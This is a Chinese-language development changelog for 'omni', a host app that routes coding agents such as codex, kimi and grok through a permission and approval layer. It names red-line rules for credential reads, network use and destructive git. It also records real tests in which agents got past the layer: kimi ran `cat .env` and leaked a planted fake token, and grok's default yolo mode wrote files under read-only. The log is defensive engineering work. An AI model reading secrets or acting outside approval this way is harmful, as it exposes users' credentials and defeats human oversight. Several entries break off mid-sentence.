## 交接文本整个删掉；切引擎改成「下一句生效」 · 2026-08-17

✅ typecheck / lint / arch / check:docs / test（924 cases）

### 1. 不再替用户写任何字

上一版把交接包从「直接发出去」改成「挂成草稿」，用户仍然否掉：那段话是
**他没打过的**，而它根本没必要存在——上一段记录的磁盘路径 omni 一直存在
`Thread.segments` 里（`/timeline` 看得见），新引擎自己有文件工具。

删掉的东西：`branch.ts` 的 `pointerOr` / `handoffText` / `draftInto`
（`handoff` 里那次「读日志 + reduceAll + buildHandoff」的整段准备工作也一起没了）、
`@omni/handoff` 的 `renderHandoff` 与 `render.ts`、渲染层的 `HandoffNote` 组件
与 `.handoff*` 七条样式、`prompt` 的 `origin` 参数。
`Item.origin` 字段留着但改成「只有旧记录里才有」——那些事件已经落盘，
重放时不该报错。

`@omni/handoff` 包本身留着：对比视图还在用它的 `buildHandoff` / `compareRuns`。

### 2. `Thread.nextEngine`：选了不等于开始用

`thread.handoff` 现在只记一笔意向（同步，没有 IO），真正的切换搬到
`branch.ts` 的 `switchEngine`，由 `prompt` 在发出第一句话时调用。

放在 `prompt` 里 `entry.turn !== undefined` 那条分支**之后**：上一轮还没跑完时
要么改向要么排队，**都不该顺手把引擎换掉**；排进队的那句话之后由 `drain`
再走一遍，那时才切。切完 `ctx.live` 换成了新的一条，所以递归重走一遍。

渲染层两处：选择器显示 `nextEngine ?? engine`（显示旧的等于告诉他「没选上」）；
有待切换时**模型清单传空**——手上那份是旧那家报的，摆一个选了会出错的控件比不摆糟。

### 3. 又是测试反过来钉住了旧行为

9 条挂掉，全是断言「分叉后有草稿」「切引擎当场生效」的。其中一条的修法值得记：
`handoffTo` 助手里要补一条 `turn.completed` ——**上一轮还没跑完时不切引擎**，
不补的话第二句话进的是队列，切换根本没发生。这不是测试的将就，
是它把那条真实约束显式化了。

## 让红线看见命令原文；顺带抓到一个藏了很久的误判 · 2026-08-17

✅ typecheck / lint / arch / check:docs / test（923 cases）+ 真机一条反证

### 1. 等一下就拿得到

`argsOf` 原来把 `detailOf` 的 `command` 送去判定，而那个字段在缺 `rawInput` 时
**退回 `title`**——展示上没问题，判定上是拿展示文本冒充事实：实测 kimi 审批时
title 就是 `"Bash"`，`splitSegments("Bash")` 得到一条无害命令，于是
`credential-read`、`rm-outside-worksite`、`exec-writes-outside-worksite`、
`git-push`、`git-destructive`、`global-install`、`network`、`unparseable-command`
**8 条红线全部匹配不上**，然后按档位静默放行。

改成只认 `rawInput.command`，缺席就缺席；`permission.ts` 在合并请求与在途表之后
**等详情补齐**（实测只晚 2ms，上限 300ms、10ms 轮询）。

等不到怎么办：`classify` 里加 `blindExec`——category 落 `unknown`。
**故意不加红线**：红线的 action 会盖掉档位地板，一条 escalate 红线会把只读档
本该安静的 `deny` 变成一次弹窗。落 unknown 正好让矩阵说话（只读 deny、
自动编辑 escalate、完全 allow）。例外表 `EXEC_WITHOUT_COMMAND`（目前只有
`KillShell`）：它的动作本来就不在命令文本里。

### 2. 命令一看得见，就露出一个藏了很久的误判

```js
[/(^|\s)\.\s+\S/, "点号 source", true]   // 想匹配 `. ./env.sh`
```

它匹配的是**任意位置的裸 `.` 且后面还有东西**，而 shell 里表示当前目录的 `.`
是最常见的操作数：`find . -name x.json`、`git add . && git commit -m x`、
`cp . /tmp/x` 全被判成「间接执行」→ escalate。锚到程序位
（`(?:^|[;&|\n])\s*\.\s+\S`）之后，真 source 照旧认得出来。

这个 bug 一直没露头，正因为 ACP 那条路上命令原文压根没送到判定器——
**修好一处观测，才看得见下一处错误**。

### 3. 真机反证：红线只在引擎肯问的时候才有发言权

自动编辑档下让 kimi 跑 `cat .env`（工作区里放了个假 token）：

```
命令看见了吗： {"kind":"shell","command":"cat .env"}   ← 等到了
审批弹窗：     0                                      ← kimi 没问过 omni
工具最终状态： ok                                      ← 跑成了
泄漏检查：     ✗ 假 token 进了回答
```

kimi 的 `auto` 档自认 `cat .env` 属于「安全操作」，直接放行。也就是说
**这一刀修好的是「引擎肯问的时候判得准」，不是「omni 说了算」**。
后者要么把 kimi 切到 `default`（每次都问 omni，由 omni 的矩阵控制弹窗量），
要么接受引擎自己的安全观——这是产品选择，留给用户拍。

## 原生审批：grok 的 ACP 会话默认 yolo，omni 一直没传那个开关 · 2026-08-17

✅ typecheck / lint / arch / check:docs / test（909 cases）+ 真机验证两档

### 两家的原生机制（读源码 + 实测，不是照文档抄）

**kimi**（`kimi acp` 0.36.1）报四个档，`session/new` 默认落在第一个：

| 档 | 它自己的描述 |
|---|---|
| `default` ← 默认 | Manual approvals; tools execute normally. |
| `plan` | Read-only planning; no tool execution. |
| `auto` | Auto-approve **safe** operations. |
| `yolo` | Auto-approve everything. |

`pickMode` 的打分结果正好是原生映射：只读→`plan`(6)、自动编辑→`auto`(4)、完全→`yolo`(8)。
**所以 kimi 这边本来就是原生的**，用户看到的多余弹窗来自 omni 自己那层
（`other` → unknown → escalate），已在上一条提交修掉。

**grok**（0.2.106）完全不同。实测对照，同一个提示词让它改一个文件：

| `session/new` 的 `_meta` | 会话 yolo 标记 | 审批请求 | 文件 |
|---|---|---|---|
| 不给（= 改之前 omni 的做法） | **true** | **0 次** | 被改了 |
| `{yoloMode:false}` | false | 1 次（带 `kind` + 完整命令） | 拒掉后没变 |

也就是说 **omni 的三档对 grok 从来没有过发言权**：选「只读」它照样写文件。
它的 TUI 有六个权限档，但 **ACP 上一个都没暴露**（`session/set_mode` 是空壳），
唯一的开关就是这个 `yoloMode`——只有「全问 / 全不问」，没有中间档。

### 映射与实现

`AcpDriverConfig.nativeApproval?: (trust) => {meta?, note?}`，和 `logPath` /
`contextUsed` 同一个注入办法。`meta` 并进 `session/new` 的 `_meta`
（**续跑与分叉那两条路也带上**，否则接着跑的会话会悄悄退回引擎默认档）；
`note` 替掉「没报告可选档位」那句通用文案。

只读 → `yoloMode:false`；自动编辑与完全 → `true` + 一句「omni 的判定对它不生效」。

真机两档都验过：
- **只读**：审批 0 次、文件没变——因为 omni 在只读档判的是 `deny` 不是 `escalate`，
  **拒得掉而且不打扰用户**。这是这套设计里少见的「更安全同时更安静」。
- **自动编辑**：0 次审批、文件被改，状态栏给出那句说明。

### 开会话时定死

`yoloMode` 在 `session/new` 里，和 codex 的 OS 沙箱一样中途改不了。
`setTrust` 时比对「开场那个值和现在要的还一样吗」，不一样就发 `degraded`——
一个「界面上换了、引擎那边没换」的档位比不给换糟得多，尤其是往严的方向换。

### 行数闸门第三次逼出真拆分

`driver.ts` 又到 307 行。`applyMode` + `warnNativeFixed` 搬进 `mode.ts`：
那个文件本来只有打分表，注释末尾写着「驱动据此报一条 `engine.status`——见 driver.ts」
——**注释里出现「见另一个文件」就是边界划错了的信号**。现在它完整拥有
「档位怎么落到引擎上、落不上怎么向用户交代」。

## 六处「引擎报了、我们没接」+ 新会话延迟落盘 · 2026-08-17

✅ typecheck / lint / arch / check:docs / test（906 cases）+ 真机验证：kimi / grok 的命令清单与用量都真的到了事件流

### 1. ACP 的斜杠命令：协议没有「列命令」这个请求

`available_commands_update` 一直在 `handleUpdate` 的 default 分支里被丢掉，
于是 kimi 的原生命令和 skill、grok 的内建命令**在 `/` 面板里一条都看不见**。

不能照 codex 那样开场问一次（`skills/list`）：ACP **没有这个方法**，
agent 是在会话建好之后自己推的。所以改成收到就发 `commands.updated`——
那本来就是「描述现状」的事件，宿主按 threadId 只留最后一条，后到覆盖先到。
真机：kimi 推 1 条（含它自己的 `/status`、`/usage`、`/mcp`、`/tasks`），
grok 推 3 条（MCP 与插件加载完各推一次）。

### 2. 自动编辑档下弹一堆窗：kimi 的 kind 映射是有损的

从它的包里读到判据（`dist/main.mjs` 的 `toolKind`）：

```js
switch (name) {
  case "Read": case "Glob": case "Grep": return "read"
  case "Write": case "Edit": return "edit"
  case "Bash": case "Terminal": return "execute"
  …
  default: return "other"     // ← 其余全在这儿
}
```

而 k3 那套工具叫 `Shell`、`ReadFile`，全部落 `other` → `acp:other` → `unknown`，
`unknown` 在 auto-edit 及以下一律 escalate。所以**每条简单命令都要问一次**。

`Request` 加一个 `toolLabel`（引擎给的 `title` 原文），`classify` 在 `tool`
认不出来时按**名字词根**补一次方向（`NAME_CATEGORY`）。三条守住的地方：
网络那条排最前（`WebFetch` 同时含 fetch 和 web）；**没有兜底成 allow 的分支**，
认不出方向照旧 `unknown`；红线与档位地板都在它之前，只读档下 `Shell` 仍然 deny。

### 3. 审批时命令原文还没到（写进已知限制，没修）

真机抓的时序：

```
+7892ms tool_call        {kind:"execute", title:"Bash"}          ← 有 kind，没命令
+8014ms request_permission {toolCallId, title:"Bash", content:[…]} ← 没 kind
+8016ms tool_call_update {rawInput:{command:"ls -la"}}            ← 命令在批准之后才来
```

也就是说 `classify` 拿到的 `args.command` 是占位串 `"Bash"`，
**omni 那套命令红线对 ACP 的 shell 命令全程失明**。这不是这一轮能修的
（协议里就没有「批准前告诉我要跑什么」），所以写进 README 已知限制，
并在更新日志里对用户明说。

### 4. 上下文用量：kimi 本来就通，grok 一条都不发

kimi 一轮收工推一条标准 `usage_update {used, size}`（真机 22072 / 1048576）。
grok **零条**——它的 token 数在私有通知里：

```json
{"update":{"sessionUpdate":"turn_completed","usage":{"inputTokens":15605,"outputTokens":33,"totalTokens":15638}}}
```

`totalTokens === input + output`，而 `cachedReadTokens` 是 input 的子集，
所以这个数正是「当前占了多少上下文」，和 codex 那边挑 `last` 是同一个语义。

窗口大小 ACP 没定字段，在扩展位：`models.availableModels[]._meta.totalContextTokens`
（grok 4.6/4.5 都是 500000）。**按模型建表**而不是只记一个数——换模型时分母会变。
私有通知的解析和 `logPath` 同一个办法注入（`AcpDriverConfig.contextUsed`），
驱动这一层不认识任何一家的私有方法名。真机：grok 15639 / 500000。

### 5. 新会话不落盘：`Ctx.uncommitted`

点「+」就往磁盘写一条空会话，重启还在。改成攒着：**界面照常立刻收到事件**，
磁盘等第一句话（`turn.started`）——那一刻把攒下的按原序一次写完。
没提交就删掉的，攒下的一起扔掉。

两条测试反过来钉住了错的行为（create 完就查 `stored`），按同一条原则改断言。

### 6. 图标：量出来的，不是看出来的

把 30 枚图标渲染进一张审查页，用 `getBBox()` 算实际包围盒（把笔画宽度算进去）
和 16×16 视口正中比：**9 枚偏心**，`ThinkIcon` 偏 dx=-0.85（左边快贴边、右边空 2.4）。
逐个移正，复量到全部 ±0.2 以内。

`ArrowDownIcon` 本身 dx=dy=0——用户报的「箭头歪」是布局问题（见下），不是图标。

`···` 是三个**文字字符**：文字按基线排版、SVG 按盒子居中，同一行里放
一个 `+` 和一个 `···` 天生对不齐。补一枚 `EllipsisIcon`，`.row__act` 改 flex 居中。

### 7. 横向滚动条：`overflow-y: auto` 单写一条是不够的

CSS 里两轴只有一个是 `visible` 时，那个 `visible` **计算成 `auto`**——
`.transcript` 于是一直「横向也能滚」，一个子元素宽一点点就冒出滚动条
（也把居中的「回到底部」按钮推偏，就是那个「歪箭头」）。

三处：`.transcript` 显式 `overflow-x: hidden`（宽内容自己滚是既定设计）；
`html/body/#root` 补 `overflow: hidden`（窗口自己永远不滚）；
`.md` 与行内 `code` 补断行——行内代码里放的就是路径，浏览器**默认不在 `/` 处断行**。

### 8. 行数闸门逼出两处真拆分

`driver.ts` 到 312 行。`attach.ts`（附件怎么变成协议内容块，唯一读用户任意文件的一段）、
用量事件收敛成 `update.ts` 里**一个出口** `emitUsage`（标准 `usage_update` 与私有通知共用，
原来两处各拼一份）。

## 接第四家引擎：Grok（`grok agent stdio`） · 2026-08-17

✅ typecheck / lint / arch / check:docs / test（885 cases）+ 真机验证：ACP 真跑两条在 grok 上全绿

### 1. 它讲 ACP，只是子命令不叫 acp

`grok --help` 里**没有** `acp` 子命令，一眼看去像是要新写一个驱动（它的 `-p` /
`--output-format streaming-json` / `--resume` / `--permission-mode` 和 Claude Code 的
CLI 形状几乎一一对应，连 `--allowedTools` 这种 compat alias 都留着）。

但它自带的文档 `~/.grok/docs/user-guide/15-agent-mode.md` 标题就是
「Agent Mode (ACP) and IDE Integration」——**`grok agent stdio` 就是 ACP 服务端**。
所以第四家仍然没有新驱动，注册表里一行：

```ts
grok: createAcpDriver({ id: "grok", command: "grok", args: ["agent", "stdio"], logPath: grokLogPath })
```

### 2. 「没声明」不等于「不支持」

实测 grok 的 `agentCapabilities.sessionCapabilities` 是个**空对象**，
而 `session/list` 答得好好的——连 `cwd`、`title`、`updatedAt` 都齐，
形状正好是 `sessionsOf()` 要的。

只认声明的话它的历史区永远是空的。**那其实是「替引擎回答」的另一种写法**，
只不过这次替它答的是「不支持」——和上一版一律 `NO_CAPABILITIES` 是同一个错。
`OpenState.canList` 改成三态（和 `probe.ts` 的三态同一个道理）：
声明了就用；没声明的**问一次**，问不出来才记成 false，之后不再问。

### 3. 推理强度：报了四档，但设不了

强度不在 `configOptions` 里（grok 根本没有这个字段），挂在
`models.availableModels[]._meta.reasoningEfforts`，`x.ai/sessionConfig` 里也以
`category: "mode"` 出现一份。看起来只要把 `effortsOf` 扩一下就能接上。

**但那个接口是空壳。** 判据是拿一个不存在的档位去试：

| 调用 | 结果 |
|---|---|
| `session/set_model` 真 id | ✓ 落盘（`summary.json` 的 `current_model_id` 变了） |
| `session/set_model` 假 id | ✗ `-32602 unknown model id` ——**它是校验的** |
| `session/set_mode` 真档位 | ✓ `{}`，但磁盘上 `reasoning_effort` 没变 |
| `session/set_mode` 假档位 | ✓ `{}` ——**什么都不校验** |

所以 grok 这一家不上报 `efforts`，界面上也就不显示强度控件。
接上去只会得到又一个「看起来生效、其实没有」（见 5d31420）。

### 4. 记录路径：这次是算得出来的

`acp/grok.ts`。和 kimi 相反——kimi 的工作区目录名是它自己算的哈希，只能查索引；
grok 的目录名就是**工作区绝对路径 URL 编码**，里层目录名就是 ACP 报的 sessionId：

```
~/.grok/sessions/%2FUsers%2Fyou%2Fwork%2Fomni/01a00e5e-…/chat_history.jsonl
```

拿全新临时目录开会话验过：ACP 回的 sessionId 与磁盘新目录同名，`summary.json`
里的 `info.id` / `info.cwd` 也对得上。交接给 `chat_history.jsonl`——一个会话目录里
还有 `events.jsonl` / `updates.jsonl` / `summary.json`，只有它是**和模型之间的全部往来**。

**算得出来还是要兜一层**：我们是用 `encodeURIComponent` 去对它 Rust 那边的编码器，
ASCII 路径上实测全部往返一致，一条中文或带空格的路径就未必。算错的代价不是报错，
是**悄悄退回交接包**，所以算不中就按 sessionId 扫一遍 `sessions/`。
端到端验过：驱动的 `logPath()` 指到的那份 `chat_history.jsonl` 有 15,953 B 真内容。

`AcpDriverConfig.logPath` 因此多收一个 `cwd`——grok 的记录按工作区分目录，
光有 sessionId 定位不到。kimi 那条少收一个参数，不用改。

### 5. 两条 live 测试断言被真机证伪

`OMNI_ACP_ARGS` 补进 `driver.live.test.ts`：以前只认 `OMNI_ACP_COMMAND`，
而**内置的两家 ACP 引擎都不是裸命令**（`kimi acp`、`grok agent stdio`），
也就是说这套真跑测试恰恰盖不到我们真正内置的那两家。

- **「工具行不能停在 running」按每条更新去断言是错的**：grok 每个工具都先补一条
  还在 running 的 `tool_call_update`，之后才落 ok/failed。改成看每个工具行的
  **最后一个**状态——否则等于要求所有引擎都不发进度。
- **「read-only 档下文件一定没变」是错的**：实测 grok 在 read-only 档下直接改了文件，
  `session/request_permission` **一次都没发**。那不是驱动接错，是审批可见性由 agent
  决定（`driver.ts` 开头那段早写着，codex-acp 上也复现过）。断言改成 omni 这一层
  唯一能保证的事：**问了就必须拒得住**。写成「文件一定没变」是把引擎侧的结构性限制
  记成了 omni 的失败，后来的人只能删测试或者改驱动去做它做不到的事。

这一条同时是用户可见的：omni 的信任档对 grok **没有约束力**，写进了更新日志与

## 交接从「注入摘要」改成「给路径」；新会话偏好落盘 · 2026-08-17

### 1. 分叉/接力不再自动发出去

`branch.ts` 的 `await prompt(...)` 换成 `draftInto(...)`：那段话落到 `Thread.draft`，

## 会话可以拖着排了；置顶现在也装会话 · 2026-08-16

✅ typecheck / lint / arch / check:docs / test（858 cases）+ 真机拖放验证

三条规则，每条都落在代码里而不是文档里：

1. **同项目内随便排。** 拖过一次，那个项目就整段按你排的来
   （`Settings.threadOrder`，按项目存）。**不做「一半手动一半自动」**——
   混合排序没人说得清一条新会话该落在哪，而说不清的排序等于随机。
   顺序表里没有的（拖过之后新建的）排在最前：它最新，也最可能是你要点的。
2. **不能跨项目。** `cwd` 是工作区边界的唯一真源——拖过去要么得改它
   （偷偷换掉一段对话的执行范围），要么不改（侧栏就在说谎）。两条都不能接受。
   挡的方式是 `onDragOver` 不调 `preventDefault`：**用平台原生的方式说不**，
   鼠标上直接是禁止标，比放下之后弹一句「不能跨项目」好得多。
3. **可以拖到置顶。** 那是唯一允许离开原项目的去处，而且**不改 cwd**——
   置顶只是换个地方显示。

「置顶」这一段从「只装项目」变成「会话 + 项目」，会话排在前面（一条被单独钉住的
对话比一整个文件夹更具体）。**置顶之后从项目里摘掉**——一条会话只出现一次是硬约束，
上一版的「最近」段就是在这上面翻的车（两处同时高亮、双击改名两个框一起进编辑态）。

右键菜单第一项是「置顶 / 取消置顶」：拖拽更快，但得先知道能拖，菜单是给还不知道的人的。

## 两个自己踩的坑

- 探针里 `dragstart / dragover / drop` **连在同一个 tick 里发**，`canDropOn` 读的是
  state，那时它还看不到「正在拖」——于是第一次跑「什么都没发生」。真拖动中间隔着
  很多帧，所以这是探针的问题不是代码的。
- 拖到置顶时**忘了调 `hoverPinned`**，整段不高亮，用户只能猜松手会不会落在这儿——
  而落点是一整段，猜不出来。

行数闸门逼出四处真拆分：`SidebarPinned.tsx`（置顶那一段）、`RowActions`（行尾那颗按钮）、
`dragProps`（一行的拖放事件，跨项目就挡在这儿）、`Foot`（侧栏最底下两行）。

## 引擎会话不再无限涨；顺带摘掉一个自己造的误报 · 2026-08-16

✅ typecheck / lint / arch / check:docs / test（821 cases）+ 真机 A/B

这一轮先把**刚做的东西按最坏情况压了一遍**，结论是不用改：
接管一条 3591 条 item 的会话，第一条 505ms 出现、1012ms 全部摆完，
滚动帧中位 6.9ms（60fps 预算 16.7）；冷启动渲染层 170ms、引擎探测 431ms。
量过了就不用猜。

## 真问题在别处：活会话不封顶

`ctx.live` 原来只在删会话和接力时收缩。而一个 codex 会话实测
**≈260 MB / 4 个进程**（app-server 加它自己拉起的 MCP 服务器）——
开五条就是 1.3 GB，而且全闲着。

改成 launch 时腾地方（不挂定时器：资源压力恰好在这一刻产生，
而定时器要多一个时钟依赖和一条测不准的路径）。
三种绝不收：正在跑的、等审批的、**没有引擎句柄的**——最后一种收掉就回不来了，
而回不来的不叫「收起来」，叫「弄丢了」。

A/B：不淘汰 7 会话 28 进程 1.83 GB；上限 4 之后 16 进程 1.06 GB。

## 中间自己摆了个乌龙，值得记

第一次数进程数出来 8 个，以为淘汰没生效，插了临时诊断才发现
**`live=4 cap=4` 一直是对的**——每个会话是**两个**进程：omni 拉起的 node 包装器
再拉起真正的 codex 二进制，两条命令行都含 `codex app-server`，被我数了两遍。
诊断第一版还用了 `status: "ready"`，而日志恰好过滤掉 ready，于是一条都没打出来。
**两次都是量错了，不是代码错了。**

## 顺带：`cancelled` 不是失败

同一批日志里看见 MCP 提示一次刷了五条 `cancelled`，而那几台服务器后来都好好的
（`codex_apps` 有 45 个工具）。上一轮那条「没见过的状态一律当失败」的判据
本身还是对的（猜一个 `failed` 字面量，猜错就是永远不报警），
但**见过的误报要一条条摘掉**。现在正常启动 0 条横幅。

## 两个「看起来生效、其实没有」 · 2026-08-16

✅ typecheck / lint / arch / check:docs / test（814 cases）+ 真机行为验证

按各包 README 自己记的「已知限制」逐条看了一遍，挑出两个**真缺陷**
（其余都是写清了取舍的有意为之）。

## 一、改信任档，codex 的沙箱其实没变——而且警告根本不显示

驱动里本来就检测到了这件事，但发的是 `status: "ready"`，
而横幅只认 `crashed / timeout / degraded`——**那句警告从来没有到过界面上**。
用户改完档位，什么反馈都没有。

先花力气确认能不能真修好，结论是**不能**，而且是拿行为验的：

- 判据必须用 `approvalPolicy: "never"`（完全不问客户端，写没写成纯由沙箱决定）。
  一开始用「收到几次审批请求」当判据是错的——那些请求在 omni 里会被 `decide()`
  自动答掉，根本不等于用户看见弹窗，而且新开的 workspace-write 会话照样有请求。
- read-only 会话写文件 → **被拦**；同连接 `thread/resume` 换成 workspace-write
  → **照样被拦**；换新进程 resume → 还是被拦；全新 workspace-write 会话 → **写成了**。
  判据有区分力，结论是沙箱确实在 `thread/start` 时定死。
- `thread/settings/update` 也不行：什么都收、回 `{}`、不发任何确认，**效果验不了**，
  不能拿它当基础。

所以只能把警告做成真的看得见（改成 `degraded`），并且**只在往上调档时出声**——
往下调是安全的，omni 自己拒得更多，宽出来的沙箱权限用不到。

顺带把沙箱那张表和它的大段论证拆成 `sandbox.ts`：
那是接第二家引擎时最重要的发现，不该埋在驱动中间当一个常量。

## 二、日志写满 32 MB 就停笔，而且一声不响

停笔本身是对的（无声地把磁盘写满更糟），但停得一声不响就成了
「你以为还在记，其实早就不记了」——重启之后发现历史断在半个月前，补不回来。
加 `onFull` 回调，界面上出一条横幅。

**没有做轮转**，理由是量：实测最大的一个会话日志 2.45 MB / 1545 行，
按平均每行 1.4 KB 算，32 MB 约合 24000 条事件，还有 15 倍余量。
真撞上再做，那时也才知道该按什么维度切。

## Claude 那半边补上：历史区（**能填出正文**）、账号行 · 2026-08-16

## 换模型要主动补强度 · 2026-08-16

✅ typecheck / lint / arch / check:docs / test（787 cases）

验 Computer Use 时撞出来的：`turn/start` 不带 effort 时 codex 用它配置里的
全局默认，而那个默认**未必是这个模型支持的档**。实测配置里是 `max`，

## codex 历史区；底部账号行；Computer Use 查清了 · 2026-08-16

## MCP 起不来要出声；改名与删除要传给 codex · 2026-08-16

✅ typecheck / lint / arch / check:docs / test（762 cases）+ 真机 A/B 验证

三件「omni 知道、codex 不知道」或反过来的事。

**一、MCP 服务器起不来是静默的能力损失。** 起不来时 codex 照跑不误，只是那台
服务器的工具全没了——实测一个 `codex_apps` 就带 45 个工具。少了它，agent 表现是
「今天做得不太行」，而你完全不知道为什么。没有任何东西出错，所以最难查。

新加一档 `EngineStatus.degraded`：**引擎活着、但掉了能力**。报 `crashed` 是撒谎，
会把排查引到错的方向。失败态的字面量**没有实测到**（这台机器 5 个全起来了，
只见过 starting / ready），所以判据反着写：不是这两个就算失败，
带了 error / failureReason 也算——猜一个 `"failed"` 字面量，猜错就是永远不报警。
只在翻面时出声：一次启动实测 17 条通知。

**二、改名没传给 codex。** codex 自己也存着会话列表，你在 omni 里改成
「修分页那个」，在 codex 那边它还叫第一句提问的前二十个字。同一条会话两处两个名字，
而你正是靠名字找它。走 `thread/name/set`。

**三、删除在 codex 那边留垃圾。** 改成先 `thread/archive` 再 dispose——
**归档不是删除**：那边的原始记录是用户的，可逆的操作才轮得到我们替他做。
顺序要紧：dispose 之后进程没了就发不出去了。

为这两件事加了 `OMNI_DEV_RENAME` / `OMNI_DEV_DELETE`——它们只能靠界面触发
（改名要双击标题、删除在行内菜单里还带二次确认），而现在有了引擎侧副作用要验。
**验不了的副作用等于没做。** 真机 A/B：只改名 → codex 列表里有它；
改名+删除 → 列表里没了。

行数闸门顺带逼出一处真拆分：审批应答从驱动搬进 `approve.ts`——
那个文件本来就是「codex 的审批怎么翻译」，驱动只该管发 RPC 和收通知。

## 同引擎分叉改走原生：「重来」不再从零开始 · 2026-08-16

✅ typecheck / lint / arch / check:docs / test（754 cases）+ 真机 journal 验证

omni 的「从这里重来」一直是**起一条全新会话 + 重发一份提炼过的目标**。
交接包只有一句目标和几条追加要求——分出来那条对「读过哪些文件、写过什么、
撞过什么错」一无所知。一个叫「重来」的功能，实际是从零开始，而界面上看不出区别。

codex 有 `thread/fork`：复制的是真的会话。跨引擎仍然只能走交接包
（各家格式不通），但同一家内部没有理由这么糙。

## 写锁：第一版设计是错的，真机才现形

第一版做成 `EngineSession.fork()`——老会话复制一份，把新句柄交给新会话去续。
真机直接失败：`thread ... already has an active writer`。
**分出来的那条归创建它的进程管**，而 omni 一个会话一个引擎进程。

三条路都试过：① 老进程 fork → 新进程 resume：✗ 写锁；
② 中间加 `thread/unsubscribe`：✗ 还是写锁（它不放锁）；
③ **新进程自己去 fork：✓**，而且分出来之后能直接开轮次、能 rollback。

所以 fork 从 `EngineSession` 挪到了 `StartRequest.forkOf`——它属于
「**这条会话怎么开场**」，和 `resume` 并列，而不是老会话上的一个方法。

## transcript 要抄过来

引擎那边什么都记得，但 omni 的记录按会话分文件存。不抄的话你看到一个空对话，
而它其实记得一切——「看起来丢了但其实没丢」比真丢了更难受，
你会把说过的话再说一遍。

抄的时候 **turn id 必须重铸**：journal 按 `turnOwner` 分文件，沿用旧 id
会把新会话的记录写进原会话的文件，两条从此互相污染，而且是静默的。

真机验证：从第二轮重来 → 新会话保留「第一句话」、丢掉第二轮，
`forkedFrom` 有、引擎句柄是独立的一条，没有写锁报错。

## 额度：握手就问，而且重置时刻一直是丢的 · 2026-08-16

✅ typecheck / lint / arch / check:docs / test（744 cases）+ 真机验证

两个问题叠在一起。

**一，只等推送。** `account/rateLimits/updated` 是跑完一轮才推的，
于是额度早就用光了 omni 一个字不说，等你打完一句按下回车才回一条红色的
`You've hit your usage limit`。改成握手完主动 `account/rateLimits/read`，
不 await——额度慢一点不该拖着会话起不来。

**二，`resetsAt` 一直被丢掉。** `toWindow` 里写的是 `typeof raw.resetsAt === "string"`，
而真实载荷是 **Unix 秒的数字**（1787196555）。所以那个字段从来没有活到界面上，
一声不响。用例里当时填的也是自己编的 ISO 串，测试因此一直是绿的——
**形状不能靠想，要探**，而且用例里的假数据必须来自真实响应。

不认毫秒：1787196555 当毫秒解出来是 1970 年，一个明显错误的时间比没有更糟。

界面上满了和没满说的是两件事：没满时说哪个窗口（本周 / 5 小时内），
满了时说**什么时候恢复**——那是唯一能照着行动的。用本机时区表述，
codex 自己按美东渲染那串英文，换个时区的人看就是错的。

真机验证：一条消息都没发，顶栏就是「额度已用尽 · 8月19日 23:29 恢复」。

## codex `turn/steer`：跑到一半改向，不再排队 · 2026-08-16

✅ typecheck / lint / arch / check:docs / test（736 cases）+ 真机 journal 反证

把 codex app-server 的 133 个方法全枚举出来（发一个不存在的方法，错误消息里
带全表），和 omni 实际调用的 9 个对了一遍。第一个真缺口是 `turn/steer`。

omni 对「它还在跑时你又打了一句」的处理一路是：抛错 → 排队 → **当场改向**。
排队不丢东西，但那句话要等几十秒才起作用，而它往往正是「别再往下走了」。

`turn/steer` 收 `{threadId, input, expectedTurnId}`。**`expectedTurnId` 是并发护栏**，
真机验过会拦：`expected active turn id 'tn-不存在的轮次' but found '01a00b43-…'`。
用户按回车到 RPC 到达之间那一轮可能刚好收工，不校验的话这句话会记到下一轮头上。

顺序是**先 steer 再发 item**：反过来的话，递不进去时 transcript 里已经多了一条
根本没送出去的用户消息——「你以为说过了」比「还在等」糟。递不进去就退回排队，
不报错：主因就是那个竞态，而队列会立刻把它发出去。

真机 journal 反证：`turn.started` 只有 1 条，两条用户消息挂在同一个 turnId 上。

能力位 `steer` 进 `EngineCapabilities`，编译器逼三家驱动表态。Claude 报 false
（SDK 没有对应入口）——**不是假装支持再偷偷排队**，那样界面就没法如实说
「这句得等」。输入框占位文案据此分两种说法。

行数闸门顺带逼出两处真拆分，边界都是本来就该有的：
`prompt.ts`（一句话走哪条路：新轮次 / 插进去 / 排队）从 `session.ts`
（一个会话怎么活）分出来；模型清单的形状转换从驱动搬进 `catalog.ts`
（那本来就是「codex 的形状 → omni 的形状」该待的地方）。

## L3 分叉：同一个目标，换一家再跑一遍 · 2026-08-15

✅ typecheck / lint / arch / check:docs / test（342 cases）+ codex 分叉给 Claude 真实验证

L3 是 README 里最后一个「写着但没有」的东西。

**和接力只差一件事：原会话不停。** 代码上也只差一件事——不 dispose 旧的、
不复用旧的 thread id。

交的还是那份交接包，但**只取目标**：接力是「接着做」，分叉是「你也做一遍」。
带上「已改动的文件」会让第二家以为活已经干了一半——这一条有用例守着。

标题带上引擎名，否则侧栏里两个会话长得一模一样。

入口是顶栏上一枚 `⑂ 下一家` 的 pill：只有两家时它就是「另一家」，
三家以上按顺序轮。做成按钮而不是下拉——分叉不是常用操作，
为它摆一个常驻选择器只会把顶栏挤满。

顺带把命令分派也换成了**由联合类型映射出来的表**（和归约器一样的理由）：
`switch` 的 `default` 会把「漏接一种命令」藏成「点了没反应」。

**实测里的一个好现象**：分叉出去的 Claude 只拿到目标，一读文件发现 codex
已经做完了，于是如实说「所以没动文件」，并问要不要改成更完整的形式——
而不是把同一件事再做一遍。

README 里也说准了：两边结果目前靠侧栏切着看，**没有并排对比视图**。

## 引擎清单由宿主给 · 2026-08-15

✅ typecheck / lint / arch / check:docs / test（338 cases）+ 真实验证

界面上的引擎下拉里列着 ZCode 和 Kimi，而 `drivers` 里只注册了 claude 和 codex——
选中直接报「未注册的引擎」。**和模型清单是同一类错误：清单写死在界面里，
迟早和真正能用的对不上。** 改成宿主启动时报一次 `engines.available`。

顺带把归约器的 switch 换成**由联合类型映射出来的分发表**：

```ts
type Handlers = { [K in Event["type"]]: (s: ViewState, e: Extract<Event, {type: K}>) => ViewState }
```

不只是为了绕过复杂度闸门。原先那个 `default: return state` **把「漏接一种事件」
藏了起来**——新增一种事件、忘了在 switch 里加一支，界面静默无反应，
而排查的人第一个怀疑的永远不是归约器。换成映射类型之后，漏一个就编译不过。

分支数就是协议的大小，不是可以拆掉的复杂度；表的形式让它不再是一坨 switch。

## L2 跨引擎接力：README 里写了半个月的东西终于是真的 · 2026-08-15

✅ typecheck / lint / arch / check:docs / test（336 cases）+ codex → Claude 真实接力

`thread.handoff` 一直是 `throw new Error("尚未实现")`，而 README 把 L2 写成
